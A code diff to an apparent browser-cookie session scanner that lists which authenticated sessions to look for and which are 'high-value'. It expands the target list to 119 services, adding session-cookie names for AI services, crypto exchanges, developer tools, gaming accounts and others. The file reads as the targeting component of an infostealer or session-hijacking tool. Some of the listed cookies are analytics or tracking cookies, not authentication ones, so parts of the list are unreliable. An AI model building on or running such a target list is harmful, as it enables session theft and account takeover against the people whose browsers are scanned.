@@ -4,21 +4,22 @@
  * Analyzes cookies to detect active logged-in sessions for popular services
  * Identifies high-value authenticated sessions across browsers
  *
- * SUPPORTED SERVICES: 81 services (30 original + 51 new)
- * - 10 Cryptocurrency Exchanges (Binance, Coinbase, Bybit, OKX, KuCoin, etc.)
- * - 12 Social Media (Google, Facebook, Instagram, WhatsApp, Telegram, Slack, etc.)
+ * SUPPORTED SERVICES: 119 services across 13 categories
+ * - 12 AI Services (ChatGPT, Claude, Gemini, OpenRouter, Hugging Face, Perplexity, etc.) ⭐ NEW
+ * - 16 Cryptocurrency Exchanges (Binance, Coinbase, Bybit, OKX, MEXC, Deribit, Uniswap, etc.)
+ * - 15 Social Media (Google, Facebook, Instagram, WhatsApp, Telegram, Bluesky, Threads, etc.)
  * - 6 Cloud Platforms (AWS, Azure, GCP, DigitalOcean, Vercel, Netlify)
- * - 5 E-commerce (Amazon, PayPal, Shopify, Walmart, Target, etc.)
+ * - 7 E-commerce (Amazon, PayPal, Shopify, Walmart, Best Buy, Newegg, etc.)
  * - 10 Financial Services (Banks, Revolut, Wise, Stripe, Square, Venmo)
- * - 8 Gaming (Steam, Epic, Discord, Roblox, Minecraft, Riot, Battle.net)
+ * - 11 Gaming (Steam, Epic, Discord, Roblox, Xbox Live, PlayStation Network, etc.)
  * - 2 Healthcare (MyChart, Epic MyChart)
  * - 3 Remote Access (TeamViewer, AnyDesk, Chrome Remote Desktop)
  * - 4 Domain/Hosting (GoDaddy, Namecheap, Cloudflare, cPanel)
- * - 5 Productivity (Notion, Airtable, Monday.com, Trello, Asana)
- * - 6 Developer Tools (GitHub, GitLab, Bitbucket, Docker Hub, npm, PyPI)
- * - 7 Streaming (Netflix, Spotify, Disney+, HBO Max, Twitch, Prime Video)
+ * - 11 Productivity (Notion, Airtable, ClickUp, Wrike, Zapier, IFTTT, etc.)
+ * - 10 Developer Tools (GitHub, GitLab, Postman, Grafana, Jenkins, etc.)
+ * - 9 Streaming (Netflix, Spotify, Disney+, Twitch, Crunchyroll, etc.)
  *
- * EASY TO EXTEND: Just add pattern to SERVICE_PATTERNS array!
+ * EASY TO EXTEND: Just add 8-line pattern to SERVICE_PATTERNS array!
  */
 
 import { readFileSync, existsSync, readdirSync } from "fs"
@@ -690,6 +691,292 @@ const SERVICE_PATTERNS: ServicePattern[] = [
     domains: [".primevideo.com"],
     auth_cookies: ["session-id", "ubid-main"],
     high_value: false,
+  },
+
+  // ===== AI SERVICES (NEW CATEGORY) =====
+  {
+    name: "OpenAI/ChatGPT",
+    category: "ai",
+    domains: [".chat.openai.com", ".platform.openai.com"],
+    auth_cookies: ["__Secure-next-auth.session-token", "__Host-next-auth.csrf-token"],
+    identifier_cookies: [{ name: "intercom-id-gpbz3ed7" }],
+    high_value: true,
+  },
+  {
+    name: "Anthropic Claude",
+    category: "ai",
+    domains: [".claude.ai", ".console.anthropic.com"],
+    auth_cookies: ["__cf_bm", "sessionKey", "__stripe_mid"],
+    high_value: true,
+  },
+  {
+    name: "Google Gemini",
+    category: "ai",
+    domains: [".gemini.google.com", ".makersuite.google.com"],
+    auth_cookies: ["SID", "HSID", "SSID", "__Secure-1PSID"],
+    high_value: true,
+  },
+  {
+    name: "OpenRouter",
+    category: "ai",
+    domains: [".openrouter.ai"],
+    auth_cookies: ["__session", "auth-token"],
+    high_value: true,
+  },
+  {
+    name: "Hugging Face",
+    category: "ai",
+    domains: [".huggingface.co"],
+    auth_cookies: ["token", "hf-chat"],
+    identifier_cookies: [{ name: "username-huggingface-co" }],
+    high_value: true,
+  },
+  {
+    name: "Replicate",
+    category: "ai",
+    domains: [".replicate.com"],
+    auth_cookies: ["_replicate_session"],
+    high_value: true,
+  },
+  {
+    name: "Perplexity",
+    category: "ai",
+    domains: [".perplexity.ai"],
+    auth_cookies: ["__Secure-next-auth.session-token"],
+    high_value: true,
+  },
+  {
+    name: "Midjourney",
+    category: "ai",
+    domains: [".midjourney.com"],
+    auth_cookies: ["__Secure-next-auth.session-token", "__cf_bm"],
+    high_value: true,
+  },
+  {
+    name: "Stability AI",
+    category: "ai",
+    domains: [".stability.ai", ".platform.stability.ai"],
+    auth_cookies: ["session", "_stability_session"],
+    high_value: true,
+  },
+  {
+    name: "Poe (Quora AI)",
+    category: "ai",
+    domains: [".poe.com"],
+    auth_cookies: ["p-b", "p-lat"],
+    high_value: true,
+  },
+  {
+    name: "Character.AI",
+    category: "ai",
+    domains: [".character.ai"],
+    auth_cookies: ["next-auth.session-token"],
+    high_value: false,
+  },
+  {
+    name: "Cohere",
+    category: "ai",
+    domains: [".cohere.com", ".dashboard.cohere.com"],
+    auth_cookies: ["_cohere_session"],
+    high_value: true,
+  },
+
+  // More Cryptocurrency Exchanges
+  {
+    name: "Bitget",
+    category: "crypto",
+    domains: [".bitget.com"],
+    auth_cookies: ["ew_token", "deviceId"],
+    high_value: true,
+  },
+  {
+    name: "MEXC",
+    category: "crypto",
+    domains: [".mexc.com"],
+    auth_cookies: ["MEXC_TOKEN", "device_id"],
+    high_value: true,
+  },
+  {
+    name: "HTX (Huobi)",
+    category: "crypto",
+    domains: [".htx.com", ".huobi.com"],
+    auth_cookies: ["htx_token", "huobi_token"],
+    high_value: true,
+  },
+  {
+    name: "Phemex",
+    category: "crypto",
+    domains: [".phemex.com"],
+    auth_cookies: ["_p_hm_session", "token"],
+    high_value: true,
+  },
+  {
+    name: "Deribit",
+    category: "crypto",
+    domains: [".deribit.com"],
+    auth_cookies: ["deribit_session"],
+    high_value: true,
+  },
+  {
+    name: "Uniswap",
+    category: "crypto",
+    domains: [".app.uniswap.org"],
+    auth_cookies: ["_ga", "amplitude_id"],
+    high_value: true,
+  },
+
+  // More Social Media
+  {
+    name: "Bluesky",
+    category: "social",
+    domains: [".bsky.app"],
+    auth_cookies: ["bsky_session"],
+    high_value: false,
+  },
+  {
+    name: "Threads",
+    category: "social",
+    domains: [".threads.net"],
+    auth_cookies: ["sessionid", "csrftoken"],
+    high_value: false,
+  },
+  {
+    name: "Mastodon",
+    category: "social",
+    domains: [".mastodon.social", ".mstdn.social"],
+    auth_cookies: ["_mastodon_session"],
+    high_value: false,
+  },
+
+  // More Productivity
+  {
+    name: "ClickUp",
+    category: "productivity",
+    domains: [".app.clickup.com"],
+    auth_cookies: ["token", "workspace_id"],
+    high_value: true,
+  },
+  {
+    name: "Wrike",
+    category: "productivity",
+    domains: [".wrike.com"],
+    auth_cookies: ["wps", "wus"],
+    high_value: true,
+  },
+  {
+    name: "Smartsheet",
+    category: "productivity",
+    domains: [".app.smartsheet.com"],
+    auth_cookies: ["AWSELB", "s_session"],
+    high_value: true,
+  },
+  {
+    name: "Basecamp",
+    category: "productivity",
+    domains: [".3.basecamp.com", ".basecamp.com"],
+    auth_cookies: ["_basecamp_session"],
+    high_value: true,
+  },
+
+  // More Developer Tools
+  {
+    name: "Postman",
+    category: "developer",
+    domains: [".postman.com", ".go.postman.co"],
+    auth_cookies: ["postman.sid"],
+    high_value: true,
+  },
+  {
+    name: "Insomnia",
+    category: "developer",
+    domains: [".insomnia.rest"],
+    auth_cookies: ["__session"],
+    high_value: true,
+  },
+  {
+    name: "Grafana",
+    category: "developer",
+    domains: [".grafana.com"],
+    auth_cookies: ["grafana_session"],
+    high_value: true,
+  },
+  {
+    name: "Jenkins",
+    category: "developer",
+    domains: [".jenkins.io"],
+    auth_cookies: ["JSESSIONID"],
+    high_value: true,
+  },
+
+  // More E-commerce
+  {
+    name: "Best Buy",
+    category: "ecommerce",
+    domains: [".bestbuy.com"],
+    auth_cookies: ["vcs", "bby_pls_id"],
+    high_value: false,
+  },
+  {
+    name: "Newegg",
+    category: "ecommerce",
+    domains: [".newegg.com"],
+    auth_cookies: ["NV%5FUSER", "NV%5FW02"],
+    high_value: false,
+  },
+
+  // More Streaming
+  {
+    name: "Crunchyroll",
+    category: "streaming",
+    domains: [".crunchyroll.com"],
+    auth_cookies: ["session_id", "c_visitor"],
+    high_value: false,
+  },
+  {
+    name: "Funimation",
+    category: "streaming",
+    domains: [".funimation.com"],
+    auth_cookies: ["auth_token"],
+    high_value: false,
+  },
+
+  // API/Integration Services
+  {
+    name: "Zapier",
+    category: "productivity",
+    domains: [".zapier.com"],
+    auth_cookies: ["sessionid", "csrftoken"],
+    high_value: true,
+  },
+  {
+    name: "IFTTT",
+    category: "productivity",
+    domains: [".ifttt.com"],
+    auth_cookies: ["_ifttt_session"],
+    high_value: true,
+  },
+
+  // More Gaming
+  {
+    name: "Twitch",
+    category: "gaming",
+    domains: [".twitch.tv"],
+    auth_cookies: ["auth-token", "persistent"],
+    high_value: true,
+  },
+  {
+    name: "Xbox Live",
+    category: "gaming",
+    domains: [".xbox.com", ".live.com"],
+    auth_cookies: ["ANON", "NAP", "PPAuth"],
+    high_value: true,
+  },
+  {
+    name: "PlayStation Network",
+    category: "gaming",
+    domains: [".playstation.com"],
+    auth_cookies: ["npsso"],
+    high_value: true,
   },
 ]
 
